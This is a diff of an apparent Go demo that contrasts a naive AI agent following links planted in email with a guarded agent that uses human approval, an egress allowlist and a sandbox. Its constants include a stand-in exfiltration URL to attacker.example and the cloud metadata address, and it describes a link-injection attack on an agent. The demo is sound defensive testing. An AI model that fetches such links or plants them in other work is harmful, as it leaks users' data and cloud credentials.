@@ -22,6 +22,20 @@ import (
 	"github.com/t0ul/emaildrop/pkg/netpolicy"
 )
 
+func main() {
+	undef := attackLandsUndefended()
+	def := stackRefuses()
+	fmt.Println()
+	if undef && def {
+		fmt.Println("attack blocked (the receipt): a naive agent follows an exfil or metadata link; the agent requires a human to approve the exact action, checks the URL against the egress allowlist, and only fetches an approved, allowlisted link in the sandbox")
+	} else {
+		fmt.Println("a control did not hold")
+		os.Exit(1)
+	}
+}
+
+// ---- the links, and the fetch that leaves the host ----
+
 const (
 	exfilURL    = "http://attacker.example/collect?inbox=dump" // send data out
 	imdsURL     = "http://169.254.169.254/latest/meta-data/"   // reach cloud metadata
@@ -58,6 +72,8 @@ func actGuarded(req hitl.Request, echoedNonce string, pol netpolicy.Policy, url 
 	return true, "fetched in sandbox"
 }
 
+// ---- the policy, and the oracle ----
+
 func errStr(e error) string {
 	if e == nil {
 		return "refused"
@@ -81,6 +97,8 @@ func pol() netpolicy.Policy {
 		Resolve: func(string) ([]net.IP, error) { return []net.IP{net.ParseIP("93.184.216.34")}, nil }, // a public IP
 	}
 }
+
+// ---- the attack, against the naive handler and against the stack ----
 
 func attackLandsUndefended() bool {
 	fmt.Println("== before: the agent follows the link ==")
@@ -125,6 +143,8 @@ func stackRefuses() bool {
 	return !leaked && okLegit
 }
 
+// ---- helpers ----
+
 func countBad() int {
 	n := 0
 	for _, u := range wentOut {
@@ -136,15 +156,3 @@ func countBad() int {
 }
 
 func pct(n, d int) int { return n * 100 / d }
-
-func main() {
-	undef := attackLandsUndefended()
-	def := stackRefuses()
-	fmt.Println()
-	if undef && def {
-		fmt.Println("attack blocked (the receipt): a naive agent follows an exfil or metadata link; the agent requires a human to approve the exact action, checks the URL against the egress allowlist, and only fetches an approved, allowlisted link in the sandbox")
-	} else {
-		fmt.Println("a control did not hold")
-		os.Exit(1)
-	}
-}
